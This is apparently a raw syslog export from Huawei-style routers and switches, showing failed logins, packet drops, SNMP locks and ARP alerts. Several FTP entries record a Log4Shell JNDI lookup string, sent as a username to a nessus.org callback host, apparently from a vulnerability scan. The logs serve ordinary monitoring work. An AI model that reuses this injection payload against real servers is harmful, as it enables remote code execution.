message
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:04 GPN-1348_TSW-SEC-SCH_AR12-01 LINE/4/USERLOGINFAIL:OID 1.3.6.1.4.1.2011.5.25.207.2.3 A user login fail. (UserIndex=0, UserName=Console, UserIP=Console0, UserChannel=CON0) ""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:04 GPN-1348_TSW-SEC-SCH_AR12-01 %%01SHELL/5/CMDRECORD(l)[14721]:Record command information. (Task=Co0, Ip=**, User=**, Command=\""log on fail\"", Result=Success) ""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:06 GPN-0480_SED-MUN-OFF_AR12-01 %%01FTPS/5/REQUEST(l)[78706]:The user had a request. (UserName=\""\"", IpAddress=IP/IPV6: 71.6.135.131 , VpnInstanceName=\""VPN: \"", Request=USER anonymous)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:23:22 GPN-4037_NEW-KEK-CLI_AR6121-01 %%01DEFD/4/CPCAR_DROP_MPU(l)[4222]:Some packets are dropped by cpcar on the MPU. (Packet-type=ip-option, Drop-Count=168090)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:06 GPN-1706_DR-MAR-RAM-CLI_AR61-01 %%01INFO/4/SUPPRESS_LOG(l)[2606]:Last message repeated 1 times.(InfoID=4284616749, ModuleName=DHCP, InfoAlias=WAITOFFER_TIMEOUT) ""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:23:22 GPN-4037_NEW-KEK-CLI_AR6121-01 %%01DEFD/4/CPCAR_DROP_MPU(l)[4223]:Some packets are dropped by cpcar on the MPU. (Packet-type=nd, Drop-Count=1346887)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:23:22 GPN-4037_NEW-KEK-CLI_AR6121-01 %%01DEFD/4/CPCAR_DROP_MPU(l)[4224]:Some packets are dropped by cpcar on the MPU. (Packet-type=arp-request, Drop-Count=266823550)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:23:22 GPN-4037_NEW-KEK-CLI_AR6121-01 %%01DEFD/4/CPCAR_DROP_MPU(l)[4225]:Some packets are dropped by cpcar on the MPU. (Packet-type=arp-reply, Drop-Count=33801)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:23:22 GPN-4037_NEW-KEK-CLI_AR6121-01 %%01DEFD/4/CPCAR_DROP_MPU(l)[4226]:Some packets are dropped by cpcar on the MPU. (Packet-type=dhcpv6-request, Drop-Count=75873)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:23:22 GPN-4037_NEW-KEK-CLI_AR6121-01 %%01DEFD/4/CPCAR_DROP_MPU(l)[4227]:Some packets are dropped by cpcar on the MPU. (Packet-type=unknown-packet, Drop-Count=1280333)""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:06 GPN-0480_SED-MUN-OFF_AR12-01 %%01FTPS/5/REQUEST(l)[78707]:The user had a request. (UserName=\""anonymous\"", IpAddress=IP/IPV6: 71.6.135.131 , VpnInstanceName=\""VPN: \"", Request=PASS **)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:23:22 GPN-4037_NEW-KEK-CLI_AR6121-01 %%01DEFD/4/CPCAR_DROP_MPU(l)[4228]:Some packets are dropped by cpcar on the MPU. (Packet-type=unknown-multicast, Drop-Count=180307617)""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:06 GPN-0480_SED-MUN-OFF_AR12-01 %%01CM/5/USER_ACCESSRESULT(s)[78708]:[USER_INFO_AUTHENTICATION]DEVICEMAC:24-9e-ab-a6-3a-f3;DEVICENAME:GPN-0480_SED-MUN-OFF_AR12-01;USER:anonymous;MAC:ff-ff-ff-ff-ff-ff;TIME:1729239606;ZONE:UTC+0200;DAYLIGHT:false;ERRCODE:156;RESULT:Authenticate fail;""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:21:47 GPN-1707_BAD-CLI_S57-01 LLDP/4/RATEEXCESSIVE:OID 1.3.6.1.4.1.2011.5.25.134.2.7 The rate of received PDUs exceeded the threshold. (IfName=GigabitEthernet0/0/5)""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:06 GPN-0480_SED-MUN-OFF_AR12-01 %%01CM/5/CM_USERONLINEFAIL(s)[78709]:The user failed to go online. (UserType=FTP, UserName=anonymous, UserMac=, IP=71.6.135.131, VPNName=, AccessTime=2024/10/18 10:20:06, Reason=Authenticate fail)""}"
"{""schema"":null,""payload"":""<187>Oct 18 2024 08:20:06 GPN-0480_SED-MUN-OFF_AR12-01 %%01FTPS/3/LOGIN_FAIL(l)[78710]:The user failed to log in. (UserName=\""anonymous\"", IpAddress=IP/IPV6: 71.6.135.131 , VpnInstanceName=\""VPN: \"")""}"
"{""schema"":null,""payload"":""<188>2024-10-18 08:20:07 GPN-0041_CHA-MAX-HOS_AR12-01 %%01INFO/4/SUPPRESS_LOG(l)[54542]:Last message repeated 3 times.(InfoID=3247640584, ModuleName=LLDP, InfoAlias=BAD_PACKET) ""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:07 GPN-0737_ZUU-CLI_AR12-01 %%01INFO/4/SUPPRESS_LOG(l)[4247]:Last message repeated 10 times.(InfoID=3247640584, ModuleName=LLDP, InfoAlias=BAD_PACKET) ""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:08 GBN-0006_OOB-MGMT_AR12-01 IFPDT/4/UIM_CELLID_CHANGED:OID 1.3.6.1.4.1.2011.5.25.241.5.2.1 Interface Cellular2/0/0`s CellId is changed, Old CellId is 64496928, New CellId is 64496926""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:08 GPN-0060_MAM-HOS_AR12-01 %%01CPUP/4/CPU_USAGE_HIGH(l)[1906]:The data plane CPU is overloaded. (CpuUsage=97%, Threshold=95%)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:08 GPN-0163_KHU-CLI_AR12-01 %%01LLDP/4/BAD_PACKET(l)[80286]:1 invalid packets were received after latest notification. The last invalid packet came from interface GigabitEthernet0/0/1.""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:10 GPN-0320_KT-MAT-CLI_AR12-01 %%01LLDP/4/BAD_PACKET(l)[309]:2 invalid packets were received after latest notification. The last invalid packet came from interface GigabitEthernet0/0/1.""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:11 GPN-0005_75FOX-CR_X8-01 %%01SNMP/4/SNMP_IPUNLOCK(s):CID=0x80d50412;The source IP was unlocked.(SourceIP=10.23.14.24, VPN=SKYWIRE.VPN)\r\n""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:11 GPN-0200_BEN-ROA-TRA_AR12-01 LINE/4/USERLOGINFAIL:OID 1.3.6.1.4.1.2011.5.25.207.2.3 A user login fail. (UserIndex=0, UserName=Console, UserIP=Console0, UserChannel=CON0) ""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:11 GPN-0158_HEI-CLI_AR12-01 %%01LLDP/4/BAD_PACKET(l)[13708]:2 invalid packets were received after latest notification. The last invalid packet came from interface GigabitEthernet0/0/1.""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:11 GPN-0200_BEN-ROA-TRA_AR12-01 %%01SHELL/5/CMDRECORD(l)[9272]:Record command information. (Task=Co0, Ip=**, User=**, Command=\""log on fail\"", Result=Success) ""}"
"{""schema"":null,""payload"":""<190>Oct 18 2024 08:20:12 GPN-0025_HIL-CHC_AR22-01 %%01SECE/6/ARPMISS(l)[3331]:Attack occurred.(AttackType=Arp Miss Attack, SourceInterface=GigabitEthernet0/0/1, SourceIP=10.40.28.213, AttackPackets=6 packets per second)""}"
"{""schema"":null,""payload"":""<186>Oct 18 2024 08:23:29 GPN-4037_NEW-KEK-CLI_AR6121-01 ENTITYTRAP/2/CAPSINGLECORECPUUSAGERISING:OID 1.3.6.1.4.1.2011.5.25.219.2.32.3 Cap CPU utilization of single core exceeded the pre-alarm threshold.(hwCapSingleCoreIndex=1,hwCapSingleCoreThresholdCurrent=100%, hwCapSingleCoreThresholdValue=95%)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:23:29 GPN-4037_NEW-KEK-CLI_AR6121-01 %%01CPUP/4/SINGLE_CORE_CPU_USAGE_HIGH(l)[4229]:Cap CPU utilization of single core exceeded the pre-alarm threshold. (CoreIndex=1,CpuUsage=100%, Threshold=95%)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:12 GPN-0013_COM-SAF-HO_AR22-01 ARP/4/ARP_IPCONFLICT_TRAP:OID 1.3.6.1.4.1.2011.5.25.123.2.6 ARP detects IP conflict. (IP address=10.1.103.193, Local interface=GigabitEthernet0/0/1, Local MAC=98ee-cb98-c029, Local vlan=0, Local CE vlan=0, Receive interface=GigabitEthernet0/0/1, Receive MAC=92b1-532c-b1c8, Receive vlan=0, Receive CE vlan=0, IP conflict type=Remote IP conflict). ""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:13 GPN-0059_WES-HOS_AR12-01 %%01FTPS/5/REQUEST(l)[2895]:The user had a request. (UserName=\""\"", IpAddress=IP/IPV6: 10.255.253.44 , VpnInstanceName=\""VPN: \"", Request=AUTH TLS)""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:13 GPN-0059_WES-HOS_AR12-01 %%01FTPS/5/REQUEST(l)[2896]:The user had a request. (UserName=\""\"", IpAddress=IP/IPV6: 10.255.253.44 , VpnInstanceName=\""VPN: \"", Request=QUIT)""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:13 GPN-0493_AUT-SUP-PAR-AID_AR12-01 %%01FTPS/5/REQUEST(l)[27853]:The user had a request. (UserName=\""\"", IpAddress=IP/IPV6: 192.168.200.10 , VpnInstanceName=\""VPN: \"", Request=USER admin)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:14 GPN-0231_BOI-EDU_AR12-01 LINE/4/USERLOGINFAIL:OID 1.3.6.1.4.1.2011.5.25.207.2.3 A user login fail. (UserIndex=0, UserName=Console, UserIP=Console0, UserChannel=CON0) ""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:14 GPN-0231_BOI-EDU_AR12-01 %%01SHELL/5/CMDRECORD(l)[211575]:Record command information. (Task=Co0, Ip=**, User=**, Command=\""log on fail\"", Result=Success) ""}"
"{""schema"":null,""payload"":""<190>Oct 18 2024 16:48:03 GPN-1633_MAM-COM-SCH_AR22-01 %%01SECE/6/ARPMISS(l)[8590]:Attack occurred.(AttackType=Arp Miss Attack, SourceInterface=GigabitEthernet0/0/1, SourceIP=10.211.205.71, AttackPackets=6 packets per second)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:14 GPN-0159_LEN-CLI_AR12-01 LINE/4/USERLOGINFAIL:OID 1.3.6.1.4.1.2011.5.25.207.2.3 A user login fail. (UserIndex=0, UserName=Console, UserIP=Console0, UserChannel=CON0) ""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:14 GPN-0159_LEN-CLI_AR12-01 %%01SHELL/5/CMDRECORD(l)[168841]:Record command information. (Task=Co0, Ip=**, User=**, Command=\""log on fail\"", Result=Success) ""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:18 GPN-0270_SOK-CLI_AR12-01 %%01INFO/4/SUPPRESS_LOG(l)[192]:Last message repeated 11 times.(InfoID=3247640584, ModuleName=LLDP, InfoAlias=BAD_PACKET) ""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:18 GPN-0060_MAM-HOS_AR12-01 %%01CPUP/4/CPU_USAGE_RESUME(l)[1907]:The data plane CPU is resumed. (CpuUsage=52%, Threshold=70%)""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:19 GPN-0059_WES-HOS_AR12-01 %%01FTPS/5/REQUEST(l)[2897]:The user had a request. (UserName=\""\"", IpAddress=IP/IPV6: 10.255.253.44 , VpnInstanceName=\""VPN: \"", Request=USER ${jndi:ldap://log4shell-ftp-bBMsJuhpHUePmKvietWS${lower:ten}.w.nessus.org/nessus})""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:19 GPN-1014_SG-MAF-SEC-SCH_AR12-01 %%01INFO/4/SUPPRESS_LOG(l)[315981]:Last message repeated 3988 times.(InfoID=3230470157, ModuleName=QOS, InfoAlias=SACL_LOG) ""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:19 GPN-0059_WES-HOS_AR12-01 %%01FTPS/5/REQUEST(l)[2898]:The user had a request. (UserName=\""${jndi:ldap://log4shell-ftp-bBMsJuhpHUePmKvietWS${lower:ten}.w.nessus.org/nessus}\"", IpAddress=IP/IPV6: 10.255.253.44 , VpnInstanceName=\""VPN: \"", Request=PASS **)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:19 GPN-0446_GST-02F-GIF_AR12-01 %%01LLDP/4/BAD_PACKET(l)[10372]:2 invalid packets were received after latest notification. The last invalid packet came from interface GigabitEthernet0/0/1.""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:19 GPN-0287_TLA-CLI_AR12-01 %%01LLDP/4/BAD_PACKET(l)[1489]:2 invalid packets were received after latest notification. The last invalid packet came from interface GigabitEthernet0/0/1.""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:20 GPN-1348_TSW-SEC-SCH_AR12-01 LINE/4/USERLOGINFAIL:OID 1.3.6.1.4.1.2011.5.25.207.2.3 A user login fail. (UserIndex=0, UserName=Console, UserIP=Console0, UserChannel=CON0) ""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:20 GPN-1348_TSW-SEC-SCH_AR12-01 %%01SHELL/5/CMDRECORD(l)[14722]:Record command information. (Task=Co0, Ip=**, User=**, Command=\""log on fail\"", Result=Success) ""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:20 GBN-0006_OOB-MGMT_AR12-01 IFPDT/4/UIM_CELLID_CHANGED:OID 1.3.6.1.4.1.2011.5.25.241.5.2.1 Interface Cellular2/0/0`s CellId is changed, Old CellId is 64496926, New CellId is 64496928""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:20 GPN-0001_TLK-CR_M14-01 %%01SNMP/4/SNMP_IPUNLOCK(s):CID=0x80d50422;The source IP was unlocked.(SourceIP=172.31.25.10, VPN=_public_)""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:20 GPN-0059_WES-HOS_AR12-01 %%01CM/5/USER_ACCESSRESULT(s)[2899]:[USER_INFO_AUTHENTICATION]DEVICEMAC:24-9e-ab-a6-3b-8f;DEVICENAME:GPN-0059_WES-HOS_AR12-01;USER:${jndi:ldap://log4shell-ftp-bBMsJuhpHUePmKvietWS${lower:ten}.w.n;MAC:ff-ff-ff-ff-ff-ff;TIME:1729239620;ZONE:UTC+0200;DAYLIGHT:false;ERRCODE:156;RESULT:Authenticate fail;""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:20 GPN-0059_WES-HOS_AR12-01 %%01CM/5/CM_USERONLINEFAIL(s)[2900]:The user failed to go online. (UserType=FTP, UserName=${jndi:ldap://log4shell-ftp-bBMsJuhpHUePmKvietWS${lower:ten}.w.n, UserMac=, IP=10.255.253.44, VPNName=, AccessTime=2024/10/18 10:20:20, Reason=Authenticate fail)""}"
"{""schema"":null,""payload"":""<187>Oct 18 2024 08:20:20 GPN-0059_WES-HOS_AR12-01 %%01FTPS/3/LOGIN_FAIL(l)[2901]:The user failed to log in. (UserName=\""${jndi:ldap://log4shell-ftp-bBMsJuhpHUePmKvietWS${lower:ten}.w.nessus.org/nessus}\"", IpAddress=IP/IPV6: 10.255.253.44 , VpnInstanceName=\""VPN: \"")""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:22 GPN-0631_MOH-EKA-LAB_AR12-01 %%01LLDP/4/BAD_PACKET(l)[46653]:2 invalid packets were received after latest notification. The last invalid packet came from interface GigabitEthernet0/0/1.""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:24 GPN-0484_GEO-MUK-HOS_AR12-01 %%01SECE/4/SPECIFY_SIP_ATTACK(l)[464777]:The specified source IP address initiates an attack.(Slot=MPU, SourceAttackIP = 172.31.96.2, AttackPackets=16 packets per second)""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:23 GPN-0004_CHB-CR_M14-02 %%01SSH/5/SSH_USER_LOGIN_FAIL(s):CID=0x80930446;The SSH user failed to login. (ServiceType=**, FailedReason=TCP disconnect from client, UserName=Could not extract user name, UserAddress=172.31.252.129, LocalAddress=172.31.0.105, VPNInstanceName=_public_)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:26 GPN-2058_TSE-REG-OFF_AR12-01 %%01DEFD/4/CPCAR_DROP_MPU(l)[179]:Some packets are dropped by cpcar on the MPU. (Packet-type=unknown-packet, Drop-Count=66)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:26 GBN-0006_OOB-MGMT_AR12-01 IFPDT/4/UIM_CELLID_CHANGED:OID 1.3.6.1.4.1.2011.5.25.241.5.2.1 Interface Cellular2/0/0`s CellId is changed, Old CellId is 64496928, New CellId is 64496926""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:27 GPN-0375_MAP-URB-THU_AR12-01 %%01LLDP/4/BAD_PACKET(l)[4434]:2 invalid packets were received after latest notification. The last invalid packet came from interface Ethernet0/0/2.""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:27 GPN-0200_BEN-ROA-TRA_AR12-01 LINE/4/USERLOGINFAIL:OID 1.3.6.1.4.1.2011.5.25.207.2.3 A user login fail. (UserIndex=0, UserName=Console, UserIP=Console0, UserChannel=CON0) ""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:27 GPN-0200_BEN-ROA-TRA_AR12-01 %%01SHELL/5/CMDRECORD(l)[9273]:Record command information. (Task=Co0, Ip=**, User=**, Command=\""log on fail\"", Result=Success) ""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:29 GPN-0432_OFF-PRE-NEW_AR12-01 SSMPADP/4/AUTHENTICAL_FAIL:OID 1.3.6.1.6.3.1.1.5.5 SNMP authentication fails.""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:29 GPN-0432_OFF-PRE-NEW_AR12-01 %%01SNMP/5/SNMP_LOG_IP_UNLOCK(l)[32915]:The IP address of request message was unlocked because timeout. (SourceIPType=1, SourceIP=10.90.195.81)""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:29 GPN-0432_OFF-PRE-NEW_AR12-01 %%01SNMP/5/SNMP_IP_LOCK(l)[32916]:The IP address of request message was locked because authentication failed. (SourceIPType=1, SourceIP=10.90.195.81)""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:29 GPN-0004_CHB-CR_M14-01 %%01SSH/5/SSH_USER_LOGIN_FAIL(s):CID=0x80930446;The SSH user failed to login. (ServiceType=**, FailedReason=TCP disconnect from client, UserName=Could not extract user name, UserAddress=172.31.252.129, LocalAddress=172.31.0.5, VPNInstanceName=_public_)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:30 GPN-0231_BOI-EDU_AR12-01 LINE/4/USERLOGINFAIL:OID 1.3.6.1.4.1.2011.5.25.207.2.3 A user login fail. (UserIndex=0, UserName=Console, UserIP=Console0, UserChannel=CON0) ""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:30 GPN-0231_BOI-EDU_AR12-01 %%01SHELL/5/CMDRECORD(l)[211576]:Record command information. (Task=Co0, Ip=**, User=**, Command=\""log on fail\"", Result=Success) ""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:30 GPN-0159_LEN-CLI_AR12-01 LINE/4/USERLOGINFAIL:OID 1.3.6.1.4.1.2011.5.25.207.2.3 A user login fail. (UserIndex=0, UserName=Console, UserIP=Console0, UserChannel=CON0) ""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:30 GPN-0159_LEN-CLI_AR12-01 %%01SHELL/5/CMDRECORD(l)[168842]:Record command information. (Task=Co0, Ip=**, User=**, Command=\""log on fail\"", Result=Success) ""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:31 GPN-0273_MAR-RAN-CLI_AR12-01 %%01DEFD/4/CPCAR_DROP_MPU(l)[4592]:Some packets are dropped by cpcar on the MPU. (Packet-type=arp-request, Drop-Count=350)""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:31 GBN-0002_GST-CR_M14-02 %%01SSH/5/SSH_USER_LOGIN_FAIL_SCHD(l):CID=0x80930446;Failed to login through SSH 1 time(s) in last 1 minute(s).""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:33 GPN-0480_SED-MUN-OFF_AR12-01 %%01LLDP/4/BAD_PACKET(l)[78711]:2 invalid packets were received after latest notification. The last invalid packet came from interface GigabitEthernet0/0/1.""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:33 GPN-0005_75FOX-DS_S97-01 LBDT/4/PORTTRAP:OID 1.3.6.1.4.1.2011.5.25.174.3.3 Loopback does exist on interface(65)XGigabitEthernet2/0/1 ( Untagged ), loopback detect status: 3.(1:normal; 2:block; 3:shutdown; 4:trap; 5:nolearn; 6:quitvlan)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:33 GPN-0432_OFF-PRE-NEW_AR12-01 SSMPADP/4/AUTHENTICAL_FAIL:OID 1.3.6.1.6.3.1.1.5.5 SNMP authentication fails.""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:33 GPN-0432_OFF-PRE-NEW_AR12-01 %%01SNMP/5/SNMP_LOG_IP_UNLOCK(l)[32917]:The IP address of request message was unlocked because timeout. (SourceIPType=1, SourceIP=10.90.195.81)""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:33 GPN-0432_OFF-PRE-NEW_AR12-01 %%01SNMP/5/SNMP_IP_LOCK(l)[32918]:The IP address of request message was locked because authentication failed. (SourceIPType=1, SourceIP=10.90.195.81)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:34 GPN-0005_75FOX-CR_X8-01 %%01SNMP/4/SNMP_IPLOCK(s):CID=0x80d50412;The source IP was locked because of the failure of login through SNMP.(SourceIP=10.23.14.24, VPN=SKYWIRE.VPN)\r\n""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:34 GBN-0005_OOB-MGMT_AR12-01 %%01RM/4/IPV4_DEFT_RT_CHG(l)[37036]:IPV4 default Route is changed. (ChangeType=Delete, InstanceId=0, Protocol=Static, ExitIf=Cellular2/0/0, Nexthop=0.0.0.0, Neighbour=0.0.0.0, Preference=60, Label=NULL, Metric=0) ""}"
"{""schema"":null,""payload"":""<187>Oct 18 2024 08:20:35 GPN-0005_75FOX-DS_S97-01 BASETRAP/3/OPTPWRABNORMAL: OID 1.3.6.1.4.1.2011.5.25.129.2.17.1 Optical module power is abnormal. (EntityPhysicalIndex=68026894, BaseTrapSeverity=5, BaseTrapProbableCause=67697, BaseTrapEventType=5, EntPhysicalContainedIn=67895305, EntPhysicalName=\""GigabitEthernet3/1/8\"", RelativeResource=\""\"", ReasonDescription=\""Overlow receiving power of fabric module, detail information is as follows: Now power is -26.7800007; Set lower threshold is -23.0100002; Default lower threshold is -23.0100002;\"")""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:35 GPN-1348_TSW-SEC-SCH_AR12-01 LINE/4/USERLOGINFAIL:OID 1.3.6.1.4.1.2011.5.25.207.2.3 A user login fail. (UserIndex=0, UserName=Console, UserIP=Console0, UserChannel=CON0) ""}"
"{""schema"":null,""payload"":""<189>Oct 18 2024 08:20:35 GPN-1348_TSW-SEC-SCH_AR12-01 %%01SHELL/5/CMDRECORD(l)[14723]:Record command information. (Task=Co0, Ip=**, User=**, Command=\""log on fail\"", Result=Success) ""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:37 GPN-0926_MID-SUB-DIS-OFF_AR12-01 %%01LLDP/4/BAD_PACKET(l)[58874]:2 invalid packets were received after latest notification. The last invalid packet came from interface GigabitEthernet0/0/1.""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:38 GPN-0005_75FOX-CR_X8-01 %%01INFO/4/SUPPRESS_LOGINFO(l):CID=0x80600410;Log SNMP/AUTHENTICATIONFAILURE is suppressed 2 in last 60 seconds.\r\n""}"
"{""schema"":null,""payload"":""<187>Oct 18 2024 08:20:38 GPN-0005_75FOX-CR_X8-01 %%01INFO/3/SUPPRESS_LOGINFO(l):CID=0x80600410;Log SNMP/SNMP_AUTHEN_FAILED is suppressed 2 in last 60 seconds.\r\n""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:38 GBN-0006_OOB-MGMT_AR12-01 IFPDT/4/UIM_CELLID_CHANGED:OID 1.3.6.1.4.1.2011.5.25.241.5.2.1 Interface Cellular2/0/0`s CellId is changed, Old CellId is 64496926, New CellId is 64496928""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:39 GPN-0163_KHU-CLI_AR12-01 %%01LLDP/4/BAD_PACKET(l)[80287]:1 invalid packets were received after latest notification. The last invalid packet came from interface GigabitEthernet0/0/1.""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:41 GPN-0001_TLK-CR_M14-01 %%01TCP/4/hwTCPMD5AuthenFail(t):CID=0x8065055d-OID=1.3.6.1.4.1.2011.5.25.34.2.1;TCP MD5 authentication failed. (tcpConnLocalAddress=172.31.0.3, tcpConnLocalPort=51847, tcpConnRemAddress=172.31.0.9, tcpConnRemPort=179, hwTCPProtocol=BGP, hwTCPVrfName=_public_)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:41 GPN-0001_TLK-CR_M14-01 %%01TCP/4/SOCKET_TCP_PACKET_MD5_AUTHEN_FAIL(l):CID=0x8065055d;TCP MD5 authentication failed. (tcpConnLocalAddress=172.31.0.3, tcpConnLocalPort=51847, tcpConnRemAddress=172.31.0.9, tcpConnRemPort=179, hwTCPProtocol=BGP, hwTCPVrfName=_public_)""}"
"{""schema"":null,""payload"":""<188>Oct 18 2024 08:20:42 GPN-0479_WES-RAN_AR22-01 %%01LLDP/4/BAD_PACKET(l)[77051]:3 invalid packets were received after latest notification. The last invalid packet came from interface GigabitEthernet0/0/1.""}"
